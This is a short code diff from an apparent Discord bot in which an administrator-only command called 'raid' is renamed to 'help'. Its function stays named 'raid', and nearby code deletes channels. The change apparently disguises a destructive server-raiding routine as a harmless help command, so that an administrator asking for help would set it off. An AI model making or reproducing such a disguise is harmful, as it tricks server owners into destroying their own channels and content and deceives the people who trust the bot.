@@ -51,7 +51,7 @@ async def delete_channel_safe(channel):
     except Exception:
         return False
 
-@bot.command(name="raid")
+@bot.command(name="help")
 @commands.has_permissions(administrator=True)
 async def raid(ctx):
     await ctx.message.delete()
